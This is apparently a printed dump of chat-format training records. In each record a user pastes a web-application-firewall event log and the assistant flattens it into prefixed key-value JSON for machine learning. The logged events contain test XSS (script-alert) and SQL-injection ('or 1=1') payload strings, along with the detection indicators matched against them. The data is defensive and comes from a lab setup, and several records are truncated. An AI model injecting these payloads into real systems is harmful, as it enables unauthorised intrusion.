\\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 54001, \\"eventData_httpHostName\\": \\"192.168.136.147:82\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Preve ...
# Bản ghi 5:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:08:22.719\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 7, \\"eventReferenceId\\": \\"cd5219a5-016b-43f9-8d36-e727260ca773\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50547, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"Cross Site Scripting, Remote Code Execution\\", \\"matchedSample\\": \\"http://192.168.136.128/<script>alert(\'xss test\')</script>\\", \\"matchedLocation\\": \\"referer\\", \\"matchedParameter\\": \\"\\", \\"waapFoundIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"matchedIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 438, \\"waapUserReputation\\": \\"Normal\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 894, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:08:22.719\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 7, \\"eventData_eventReferenceId\\": \\"cd5219a5-016b-43f9-8d36-e727260ca773\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50547, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"eventData_practiceName\\": \\"local_policy/appse ...
# Bản ghi 6:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:41:14.999\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 8, \\"eventReferenceId\\": \\"7a62a2ae-b64f-4f1e-936b-7317d241272a\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50911, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"SQL Injection\\", \\"matchedSample\\": \\"\\\\\\"\' or \'1\'=\'1\' --\\\\\\",\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"username\\", \\"waapFoundIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"matchedIndicators\\": \\"[\\\\\\", \', \'=\', --, =, or, probing, regex_postfix_0, regex_postfix_1, regex_prefix_0, regex_prefix_1, regex_sqli_0, regex_sqli_13, regex_sqli_15, regex_sqli_17, regex_sqli_22, regex_sqli_26]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 124, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 971, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:41:14.999\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 8, \\"eventData_eventReferenceId\\": \\"7a62a2ae-b64f-4f1e-936b-7317d241272a\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50911, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\" ...
# Bản ghi 7:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:04:40.273\\", \\"eventName\\": \\"Web AppSec Policy Loaded Successfully\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Low\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\"}, \\"eventData\\": {\\"logIndex\\": 1}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:04:40.273\\", \\"eventName\\": \\"Web AppSec Policy Loaded Successfully\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Low\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventData_logIndex\\": 1, \\"eventData_assetId\\": \\"\\", \\"eventData_practiceId\\": \\"\\", \\"eventData_waapFoundIndicators\\": \\"\\", \\"eventData_httpMethod\\": \\"\\", \\"eventData_ruleName\\": \\"\\", \\"eventData_practiceName\\": \\"\\", \\"eventData_waapUserReputationScore\\": \\"\\", \\"eventData_waapCalculatedThreatLevel\\": \\"\\", \\"eventSource_assetName\\": \\"\\", \\"eventData_matchedSample\\": \\"\\", \\"eventData_waapFinalScore\\": \\"\\", \\"eventData_eventConfidence\\": \\"\\", \\"eventData_waapIncidentType\\": \\"\\", \\"eventData_serviceName\\": \\"\\", \\"eventData_httpHostName\\": \\"\\", \\"eventData_practiceType\\": \\"\\", \\"eventSource_assetId\\": \\"\\", \\"eventData_learnedIndicators\\": \\"\\", \\"eventData_eventReferenceId\\": \\"\\", \\"eventData_assetName\\": \\"\\", \\"eventData_matchedLocation\\": \\"\\", \\"eventData_waapOverride\\": \\"\\", \\"eventData_httpSourceId\\": \\"\\", \\"eventData_matchedIndicators\\": \\"\\", \\"eventData_matchedParameter\\": \\"\\", \\"eventData_waapUriFalsePositiveScore\\": \\"\\", \\"eventData_waapUserReputation\\": \\"\\", \\"eventData_ruleId\\": \\"\\", \\"eventData_waapKeywordsScore\\": \\"\\", \\"eventTags_1\\": \\"\\", \\"eventData_reservedNgenA\\": \\"\\", \\"eventData_sourcePort\\": \\"\\", \\"eventData_sourceIP\\": \\"\\", \\"eventData_securityAction\\": \\"\\", \\"eventData_practiceSubType\\": \\"\\"}", "role": "assistant"}]'}
# Bản ghi 8:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:08:25.355\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 8, \\"eventReferenceId\\": \\"d29644b0-8936-4de6-92e1-6bacc8057a55\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.1\\", \\"httpSourceId\\": \\"192.168.136.1\\", \\"sourcePort\\": 50547, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"Cross Site Scripting, Remote Code Execution\\", \\"matchedSample\\": \\"http://192.168.136.128/<script>alert(\'xss test\')</script>\\", \\"matchedLocation\\": \\"referer\\", \\"matchedParameter\\": \\"\\", \\"waapFoundIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"matchedIndicators\\": \\"[\', <, <script, >, alert(, probing, regex_code_execution_1]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 438, \\"waapUserReputation\\": \\"Normal\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 894, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:08:25.355\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 8, \\"eventData_eventReferenceId\\": \\"d29644b0-8936-4de6-92e1-6bacc8057a55\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.1\\", \\"eventData_httpSourceId\\": \\"192.168.136.1\\", \\"eventData_sourcePort\\": 50547, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"eventData_practiceName\\": \\"local_policy/appse ...
# Bản ghi 9:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-21T15:18:47.045\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Medium\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"Unknown\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 10, \\"eventReferenceId\\": \\"8bf04db6-1e53-49c8-8ddc-5f7bb5aebda4\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Medium\\", \\"sourceIP\\": \\"192.168.136.133\\", \\"httpSourceId\\": \\"192.168.136.133\\", \\"sourcePort\\": 56286, \\"httpHostName\\": \\"192.168.136.147:82\\", \\"httpMethod\\": \\"POST\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"General\\", \\"matchedSample\\": \\"pass\'word\\", \\"matchedLocation\\": \\"body\\", \\"matchedParameter\\": \\"password\\", \\"waapFoundIndicators\\": \\"[\', probing]\\", \\"matchedIndicators\\": \\"[\', probing]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 166, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 184, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 276, \\"waapCalculatedThreatLevel\\": 2}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-21T15:18:47.045\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Medium\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"Unknown\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 10, \\"eventData_eventReferenceId\\": \\"8bf04db6-1e53-49c8-8ddc-5f7bb5aebda4\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Medium\\", \\"eventData_sourceIP\\": \\"192.168.136.133\\", \\"eventData_httpSourceId\\": \\"192.168.136.133\\", \\"eventData_sourcePort\\": 56286, \\"eventData_httpHostName\\": \\"192.168.136.147:82\\", \\"eventData_httpMethod\\": \\"POST\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"3943d645-b4dd-4185-b9e8-bbf46642b795\\", \\"eventData_practiceName\\": \\"local_policy/appsec-best-practice\\", \\"eventData_waapIncidentType\\": \\"General\\", \\"eventData_matchedSample\\": \\"pass\'word\\", \\"eventData_matchedLocation\\": \\"body\\", \\"eventData_matchedParameter\\": \\"password\\", \\"eventData_ ...
# Bản ghi 10:
# ...
# Bản ghi 56:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-20T14:40:00.173\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Threat Prevention\\", \\"Web Application & API Protection\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\"}, \\"eventData\\": {\\"logIndex\\": 3, \\"eventReferenceId\\": \\"ce7fa42b-6649-4205-a984-8ab2a07201b3\\", \\"assetId\\": \\"Any\\", \\"assetName\\": \\"Any\\", \\"eventConfidence\\": \\"Very High\\", \\"sourceIP\\": \\"192.168.136.128\\", \\"httpSourceId\\": \\"192.168.136.128\\", \\"sourcePort\\": 60560, \\"httpHostName\\": \\"192.168.136.128\\", \\"httpMethod\\": \\"GET\\", \\"ruleId\\": \\"Any\\", \\"securityAction\\": \\"Detect\\", \\"waapOverride\\": \\"None\\", \\"practiceType\\": \\"Threat Prevention\\", \\"practiceSubType\\": \\"Web Application\\", \\"ruleName\\": \\"Any\\", \\"practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"practiceName\\": \\"local_policy/appsec-best-practice\\", \\"waapIncidentType\\": \\"Cross Site Scripting\\", \\"matchedSample\\": \\"<script>alert(1)</script>\\", \\"matchedLocation\\": \\"url parameter\\", \\"matchedParameter\\": \\"q\\", \\"waapFoundIndicators\\": \\"[<, <script, >, alert(, probing]\\", \\"matchedIndicators\\": \\"[<, <script, >, alert(, probing]\\", \\"learnedIndicators\\": \\"\\", \\"waapUserReputationScore\\": 113, \\"waapUserReputation\\": \\"Low\\", \\"waapUriFalsePositiveScore\\": 864, \\"waapKeywordsScore\\": 799, \\"reservedNgenA\\": 0, \\"waapFinalScore\\": 1000, \\"waapCalculatedThreatLevel\\": 4}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-20T14:40:00.173\\", \\"eventName\\": \\"Web Request\\", \\"eventSeverity\\": \\"Critical\\", \\"eventPriority\\": \\"High\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Threat Prevention\\", \\"eventTags_1\\": \\"Web Application & API Protection\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventSource_assetId\\": \\"Any\\", \\"eventSource_assetName\\": \\"Any\\", \\"eventData_logIndex\\": 3, \\"eventData_eventReferenceId\\": \\"ce7fa42b-6649-4205-a984-8ab2a07201b3\\", \\"eventData_assetId\\": \\"Any\\", \\"eventData_assetName\\": \\"Any\\", \\"eventData_eventConfidence\\": \\"Very High\\", \\"eventData_sourceIP\\": \\"192.168.136.128\\", \\"eventData_httpSourceId\\": \\"192.168.136.128\\", \\"eventData_sourcePort\\": 60560, \\"eventData_httpHostName\\": \\"192.168.136.128\\", \\"eventData_httpMethod\\": \\"GET\\", \\"eventData_ruleId\\": \\"Any\\", \\"eventData_securityAction\\": \\"Detect\\", \\"eventData_waapOverride\\": \\"None\\", \\"eventData_practiceType\\": \\"Threat Prevention\\", \\"eventData_practiceSubType\\": \\"Web Application\\", \\"eventData_ruleName\\": \\"Any\\", \\"eventData_practiceId\\": \\"423a7eb6-16d7-494d-8d55-dd8bd4780d1c\\", \\"eventData_practiceName\\": \\"local_policy/appsec-best-practice\\", \\"eventData_waapIncidentType\\": \\"Cross Site Scripting\\", \\"eventData_matchedS ...
# Bản ghi 57:
# {'text': '[{"content": "{\\"eventTime\\": \\"2025-06-21T14:13:12.984\\", \\"eventName\\": \\"Check Point Nano-service started\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags\\": [\\"Informational\\"], \\"eventSource\\": {\\"agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventTraceId\\": \\"\\", \\"eventSpanId\\": \\"\\", \\"issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"serviceName\\": \\"HTTP Transaction Handler\\", \\"serviceId\\": \\"1\\"}, \\"eventData\\": {\\"logIndex\\": 2, \\"serviceName\\": \\"HTTP Transaction Handler\\"}}\\ndo log processing for me from above file into understandable form for machine learning to read", "role": "user"}, {"content": "{\\"eventTime\\": \\"2025-06-21T14:13:12.984\\", \\"eventName\\": \\"Check Point Nano-service started\\", \\"eventSeverity\\": \\"Info\\", \\"eventPriority\\": \\"Medium\\", \\"eventType\\": \\"Event Driven\\", \\"eventLevel\\": \\"Log\\", \\"eventLogLevel\\": \\"info\\", \\"eventAudience\\": \\"Security\\", \\"eventAudienceTeam\\": \\"\\", \\"eventFrequency\\": 0, \\"eventTags_0\\": \\"Informational\\", \\"eventSource_agentId\\": \\"fbfb6a19-daf7-41e5-a25c-bf3a1472e97a\\", \\"eventSource_eventTraceId\\": \\"\\", \\"eventSource_eventSpanId\\": \\"\\", \\"eventSource_issuingEngineVersion\\": \\"1.1.26-open-source\\", \\"eventSource_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventSource_serviceId\\": \\"1\\", \\"eventData_logIndex\\": 2, \\"eventData_serviceName\\": \\"HTTP Transaction Handler\\", \\"eventData_assetId\\": \\"\\", \\"eventData_practiceId\\": \\"\\", \\"eventData_waapFoundIndicators\\": \\"\\", \\"eventData_httpMethod\\": \\"\\", \\"eventData_ruleName\\": \\"\\", \\"eventData_practiceName\\": \\"\\", \\"eventData_waapUserReputationScore\\": \\"\\", \\"eventData_waapCalculatedThreatLevel\\": \\"\\", \\"eventSource_assetName\\": \\"\\", \\"eventData_matchedSample\\": \\"\\", \\"eventData_waapFinalScore\\": \\"\\", \\"eventData_eventConfidence\\": \\"\\", \\"eventData_waapIncidentType\\": \\"\\", \\"eventData_httpHostName\\": \\"\\", \\"eventData_practiceType\\": \\"\\", \\"eventSource_assetId\\": \\"\\", \\"eventData_learnedIndicators\\": \\"\\", \\"eventData_eventReferenceId\\": \\"\\", \\"eventData_assetName\\": \\"\\", \\"eventData_matchedLocation\\": \\"\\", \\"eventData_waapOverride\\": \\"\\", \\"eventData_httpSourceId\\": \\"\\", \\"eventData_matchedIndicators\\": \\"\\", \\"eventData_matchedParameter\\": \\"\\", \\"eventData_waapUriFalsePositiveScore\\": \\"\\", \\"eventData_waapUserReputation\\": \\"\\", \\"eventData_ruleId\\": \\"\\", \\"eventData_waapKeywordsScore\\": \\"\\", \\"eventTags_1\\": \\"\\", \\"eventData_reservedNgenA\\": \\"\\", \\"eventData_sourcePort\\": \\"\\", \\"eventData_sourceIP\\": \\"\\", \\"eventData_securityAction\\": \\"\\", \\"eventData_practiceSubType\\": \\"\\"}", "role": "assistant"}]'}
# Bản ghi 58:
